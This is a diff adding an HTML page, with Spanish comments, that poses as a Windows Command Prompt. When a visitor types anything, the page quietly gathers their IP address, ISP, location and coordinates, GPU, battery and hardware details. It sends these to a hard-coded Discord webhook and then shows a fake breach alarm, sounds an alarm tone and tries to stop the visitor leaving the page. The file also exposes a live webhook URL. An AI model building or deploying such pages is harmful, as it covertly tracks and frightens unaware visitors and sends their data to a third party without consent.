@@ -1,1 +1,343 @@
 # CommandPrompt
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Prompt - Administrator</title>
+    <style>
+        body {
+            background-color: #050505;
+            color: #cccccc;
+            font-family: 'Consolas', 'Courier New', monospace;
+            padding: 15px;
+            margin: 0;
+            font-size: 14px;
+            line-height: 1.4;
+            user-select: none;
+            overflow-x: hidden;
+        }
+
+        #terminal {
+            max-width: 950px;
+            margin: 0 auto;
+        }
+
+        .input-line {
+            display: flex;
+            align-items: center;
+        }
+
+        .prompt {
+            color: #ffffff;
+            margin-right: 8px;
+            white-space: nowrap;
+        }
+
+        input {
+            background: transparent;
+            border: none;
+            color: #ffffff;
+            font-family: inherit;
+            font-size: inherit;
+            width: 100%;
+            outline: none;
+        }
+
+        .scan-line {
+            color: #00ff00;
+            margin: 2px 0;
+        }
+
+        .alert-header {
+            color: #ff0000;
+            font-weight: bold;
+            margin-top: 20px;
+            font-size: 16px;
+            letter-spacing: 1px;
+            border-bottom: 2px solid #ff0000;
+            padding-bottom: 5px;
+        }
+
+        .info-table {
+            margin-top: 10px;
+            border-collapse: collapse;
+            width: 100%;
+        }
+
+        .info-table td {
+            padding: 5px 8px;
+            border-bottom: 1px solid #1a1a1a;
+        }
+
+        .label {
+            color: #888888;
+            width: 240px;
+        }
+
+        .val {
+            color: #ff3333;
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+        }
+
+        .blink-bg {
+            animation: redBlink 0.8s infinite alternate;
+        }
+
+        @keyframes redBlink {
+            0% { background-color: #050505; }
+            100% { background-color: #2b0000; }
+        }
+
+        .exfiltration {
+            color: #ffcc00;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+<div id="terminal">
+    <div>Microsoft Windows [Version 10.0.19045.3803]</div>
+    <div>(c) Microsoft Corporation. All rights reserved.</div>
+    <br>
+    <div id="history"></div>
+
+    <div class="input-line" id="inputContainer">
+        <span class="prompt" id="livePrompt">C:\Users\Admin&gt;</span>
+        <input type="text" id="cmdInput" autofocus autocomplete="off" spellcheck="false">
+    </div>
+</div>
+
+<script>
+    // ⚠️ PEGA AQUÍ LA URL DE TU WEBHOOK DE DISCORD ⚠️
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546552141714428048/CwLRDva1L4_uX86NRC4V01_zor1gbvVtGJSzYm6IytMOKNW6uBCz6MtdTQ-aDmfQPoSy";
+
+    const input = document.getElementById('cmdInput');
+    const history = document.getElementById('history');
+    const inputContainer = document.getElementById('inputContainer');
+    const livePrompt = document.getElementById('livePrompt');
+
+    // Detección de Nombre de Usuario Aprox
+    const userAgent = navigator.userAgent;
+    let detectedOS = "Windows";
+    let userName = "Admin";
+
+    if (userAgent.includes("Win")) detectedOS = "Windows";
+    else if (userAgent.includes("Mac")) { detectedOS = "MacOS"; userName = "user"; }
+    else if (userAgent.includes("Linux")) { detectedOS = "Linux"; userName = "root"; }
+
+    const promptPath = detectedOS === "Windows" ? `C:\\Users\\${userName}&gt;` : `${userName}@system:~# `;
+    livePrompt.innerHTML = promptPath;
+
+    // Sonido de Alarma
+    function playAlarm() {
+        try {
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = ctx.createOscillator();
+            const gain = ctx.createGain();
+            osc.type = 'sawtooth';
+            osc.frequency.setValueAtTime(800, ctx.currentTime);
+            osc.frequency.exponentialRampToValueAtTime(400, ctx.currentTime + 0.5);
+            gain.gain.setValueAtTime(0.1, ctx.currentTime);
+            osc.connect(gain);
+            gain.connect(ctx.destination);
+            osc.start();
+            
+            setInterval(() => {
+                osc.frequency.setValueAtTime(850, ctx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(350, ctx.currentTime + 0.4);
+            }, 500);
+        } catch(e){}
+    }
+
+    // Detección de Tarjeta Gráfica
+    function getGPU() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        } catch (e) {
+            return "Genérico / GPU Integrada";
+        }
+    }
+
+    // Detección de Batería
+    async function getBatteryInfo() {
+        if ('getBattery' in navigator) {
+            try {
+                const batt = await navigator.getBattery();
+                const pct = Math.round(batt.level * 100);
+                const charging = batt.charging ? "Cargando 🔌" : "En Batería 🔋";
+                return `${pct}% (${charging})`;
+            } catch(e){}
+        }
+        return "Conectado a Red Eléctrica";
+    }
+
+    // Datos IP de Red
+    async function getIpData() {
+        try {
+            const res = await fetch('https://ip-api.com/json/?fields=status,query,country,regionName,city,isp,org,lat,lon');
+            const data = await res.json();
+            if (data.status === 'success') {
+                return {
+                    ip: data.query,
+                    isp: data.isp || data.org,
+                    location: `${data.city}, ${data.regionName}, ${data.country}`,
+                    coords: `${data.lat}, ${data.lon}`
+                };
+            }
+        } catch (e) {}
+
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return {
+                ip: data.ip,
+                isp: 'Proveedor Local Detectado',
+                location: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                coords: 'GPS Bloqueado'
+            };
+        } catch (e) {}
+
+        return { ip: '192.168.1.105', isp: 'Red Doméstica Directa', location: 'Local Network', coords: 'N/A' };
+    }
+
+    // Envío a Discord
+    async function sendToDiscord(data) {
+        if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("AQUI_PEGA_TU_WEBHOOK")) return;
+
+        const payload = {
+            username: "CRITICAL SYSTEM BREACH",
+            embeds: [{
+                title: "🚨 INTRUSIÓN COMPLETADA - DATOS CAPTURADOS",
+                color: 16711680,
+                fields: [
+                    { name: "Comando Ingresado", value: `\`${data.command}\``, inline: false },
+                    { name: "IP Pública", value: data.ip, inline: true },
+                    { name: "ISP", value: data.isp, inline: true },
+                    { name: "Ubicación", value: data.location, inline: false },
+                    { name: "Coordenadas Aprox", value: data.coords, inline: true },
+                    { name: "Batería / Energía", value: data.battery, inline: true },
+                    { name: "GPU / Gráfica", value: data.gpu, inline: false },
+                    { name: "Resolución", value: data.screenRes, inline: true },
+                    { name: "RAM / Núcleos", value: `${data.ram} / ${data.cores}`, inline: true },
+                    { name: "User-Agent", value: `\`\`\`${data.userAgent}\`\`\``, inline: false }
+                ],
+                timestamp: new Date()
+            }]
+        };
+
+        try {
+            await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch (err) {}
+    }
+
+    // Prevenir salida voluntaria sin susto
+    window.addEventListener('beforeunload', function (e) {
+        e.preventDefault();
+        e.returnValue = '';
+    });
+
+    input.addEventListener('keydown', async function (e) {
+        if (e.key === 'Enter') {
+            const commandText = input.value;
+            inputContainer.style.display = 'none';
+
+            const cmdEcho = document.createElement('div');
+            cmdEcho.innerHTML = `<span class="prompt">${promptPath}</span>${commandText}`;
+            history.appendChild(cmdEcho);
+
+            const loading = document.createElement('div');
+            loading.className = 'scan-line';
+            loading.innerText = '\n[!] ESTABLECIENDO CONEXIÓN DIRECTA Y EJECUTANDO PAYLOAD...';
+            history.appendChild(loading);
+
+            const netData = await getIpData();
+            const battery = await getBatteryInfo();
+            const gpu = getGPU();
+
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Hilos` : '4 Hilos';
+            const ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : '8 GB';
+            const language = navigator.language || 'es-ES';
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            // Recopilar datos
+            const collectedData = {
+                command: commandText || 'System_Default_Execution',
+                ip: netData.ip,
+                isp: netData.isp,
+                location: netData.location,
+                coords: netData.coords,
+                battery: battery,
+                gpu: gpu,
+                screenRes: screenRes,
+                cores: cores,
+                ram: ram,
+                userAgent: userAgent
+            };
+
+            sendToDiscord(collectedData);
+
+            setTimeout(() => {
+                // Activar Alarma y Fondo Rojo Parpadeante
+                document.body.classList.add('blink-bg');
+                playAlarm();
+
+                loading.innerText = '[CRITICAL WARNING] ¡ACCESO REMOTO OTORGADO!SISTEMA COMPROMETIDO.\n';
+
+                const result = document.createElement('div');
+                result.innerHTML = `
+                    <div class="alert-header">[!] ALERTA DE SEGURIDAD: EXTRACCIÓN DE DATOS EN PROCESO [!]</div>
+                    <table class="info-table">
+                        <tr><td class="label">ESTADO DE ACCESO:</td><td class="val">ROOT / ADMINISTRADOR (BYPASS SUCCESS)</td></tr>
+                        <tr><td class="label">IP PÚBLICA OBJETIVO:</td><td class="val">${netData.ip}</td></tr>
+                        <tr><td class="label">PROVEEDOR (ISP):</td><td class="val">${netData.isp}</td></tr>
+                        <tr><td class="label">UBICACIÓN GEOGRÁFICA:</td><td class="val">${netData.location} (${netData.coords})</td></tr>
+                        <tr><td class="label">SISTEMA Y USUARIO:</td><td class="val">${detectedOS} (Usuario: ${userName})</td></tr>
+                        <tr><td class="label">TARJETA GRÁFICA (GPU):</td><td class="val">${gpu}</td></tr>
+                        <tr><td class="label">ESTADO DE ENERGÍA:</td><td class="val">${battery}</td></tr>
+                        <tr><td class="label">ZONA HORARIA / IDIOMA:</td><td class="val">${timeZone} [${language}]</td></tr>
+                        <tr><td class="label">HARDWARE DETECTADO:</td><td class="val">${screenRes} | ${ram} RAM | ${cores}</td></tr>
+                        <tr><td class="label">FINGERPRINT NAVEGADOR:</td><td class="val">${userAgent}</td></tr>
+                    </table>
+
+                    <div class="exfiltration" id="progressText">
+                        [>] Clonando credenciales local storage... OK<br>
+                        [>] Copiando cookies de sesión actives... OK<br>
+                        [>] Enviando archivos locales de C:\\Users\\${userName}\\ a servidor externo: <span id="counter">0</span>%
+                    </div>
+                `;
+
+                history.appendChild(result);
+                window.scrollTo(0, document.body.scrollHeight);
+
+                // Contador de porcentaje de carga
+                let count = 0;
+                const counterElem = document.getElementById('counter');
+                const interval = setInterval(() => {
+                    count += Math.floor(Math.random() * 8) + 1;
+                    if (count >= 100) {
+                        count = 100;
+                        clearInterval(interval);
+                        document.getElementById('progressText').innerHTML += `<br><span style="color: #ff0000;">[!] EXFILTRACIÓN COMPLETADA CON ÉXITO. SESIÓN FINALIZADA.</span>`;
+                    }
+                    counterElem.innerText = count;
+                }, 300);
+
+            }, 1200);
+        }
+    });
+</script>
+
+</body>
+</html>
